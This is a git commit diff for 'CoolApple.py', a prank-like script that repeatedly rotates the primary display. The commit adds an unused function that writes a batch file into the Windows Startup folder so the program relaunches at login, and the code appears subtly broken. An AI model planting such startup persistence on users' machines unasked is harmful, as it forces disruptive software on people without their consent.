e919295fa1c84bce4a34b15ae13b2be9721d2e44
admino69 <140599622+admino69@users.noreply.github.com>
2024-02-23 12:51:24 +0100

    Update CoolApple.py
    Possibly added autostart function.

--- CoolApple.py
+++ CoolApple.py
@@ -1,5 +1,19 @@
 import time
 import rotatescreen as rs
+import getpass
+
+#WARNING: Do not run this on the main computer. I'm not entirelyt sure what it will do, use a VM instead. ---
+import os
+USER_NAME = getpass.getuser()
+
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+        bat_file.write(r'start "" "%s"' % file_path)   
+
+#---------------------------------------
 
 def rotate_primary_display():
     pd = rs.get_primary_display()
@@ -10,7 +24,6 @@ def rotate_primary_display():
             for x in angles:
                 pd.rotate_to(x)
                 time.sleep(0.1) # Adjust the sleep duration as needed
-
 
 if __name__ == "__main__":
     rotate_primary_display()
